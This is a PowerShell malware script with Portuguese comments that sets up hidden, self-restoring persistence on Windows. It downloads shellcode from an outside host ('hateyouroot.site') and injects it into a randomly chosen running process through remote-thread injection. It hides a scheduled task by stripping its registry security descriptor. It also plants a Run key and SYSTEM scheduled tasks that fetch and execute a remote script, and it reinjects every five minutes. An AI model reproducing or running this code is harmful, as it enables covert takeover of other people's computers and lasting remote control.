# persist_main.ps1 - PERSISTÊNCIA IMORTAL (FILELESS + ROOTKIT)

# === BAIXAR SHELLCODE COM REDIRECT FIX ===
function Get-RemoteBinary {
    param([string]$Url)
    try {
        $request = [System.Net.WebRequest]::Create($Url)
        $request.AllowAutoRedirect = $true
        $request.MaximumAutomaticRedirections = 10
        $request.Timeout = 15000
        $response = $request.GetResponse()
        $stream = $response.GetResponseStream()
        $ms = New-Object IO.MemoryStream
        $stream.CopyTo($ms)
        $stream.Close(); $response.Close()
        return $ms.ToArray()
    } catch { return $null }
}

$Shellcode = Get-RemoteBinary -Url "http://hateyouroot.site/payload_shc.bin"
if(!$Shellcode) { exit }

# === INJEÇÃO EM PROCESSO ALEATÓRIO ===
function Invoke-Shellcode {
    param([byte[]]$Code)
    $procs = @("svchost","explorer","msedge","chrome","notepad","winlogon")
    $p = Get-Process | ?{$procs -contains $_.Name} | Get-Random
    if(!$p) { $p = Start-Process explorer -PassThru -WindowStyle Hidden; Start-Sleep 1 }

    Add-Type @"
using System; using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")] public static extern IntPtr OpenProcess(int a, bool b, int c);
    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr f, IntPtr p, uint f, IntPtr i);
}
"@
    $h = [Win32]::OpenProcess(0x1F0FFF, $false, $p.Id)
    $a = [Win32]::VirtualAllocEx($h, [IntPtr]::Zero, $Code.Length, 0x3000, 0x40)
    [Win32]::WriteProcessMemory($h, $a, $Code, $Code.Length, [ref]0)
    [Win32]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $a, [IntPtr]::Zero, 0, [IntPtr]::Zero)
}

# === ROOTKIT: ESCONDER TAREFA ===
$task = "WindowsCoreService"
$reg = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$task"
if(Test-Path $reg) { Remove-ItemProperty -Path $reg -Name "SD" -Force -ErrorAction SilentlyContinue }

# === REGISTRY BACKUP ===
$run = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$val = 'powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString(''http://hateyouroot.site/persist.ps1''"))"'
if(!(Get-ItemProperty $run -Name "WindowsHelper" -ErrorAction SilentlyContinue)) {
    New-ItemProperty -Path $run -Name "WindowsHelper" -Value $val -Force | Out-Null
}

# === LOOP INFINITO (5 MIN) ===
while($true) {
    try { Invoke-Shellcode -Code $Shellcode } catch {}
    
    # Recria task se apagada
    if(!(Get-ScheduledTask $task -ErrorAction SilentlyContinue)) {
        $cmd = 'powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString(''http://hateyouroot.site/persist.ps1''"))"'
        schtasks /create /tn $task /tr $cmd /sc onstart /ru SYSTEM /f 2>$null
        schtasks /create /tn $task /tr $cmd /sc onlogon /ru SYSTEM /f 2>$null
    }
    Start-Sleep -Seconds 300
}
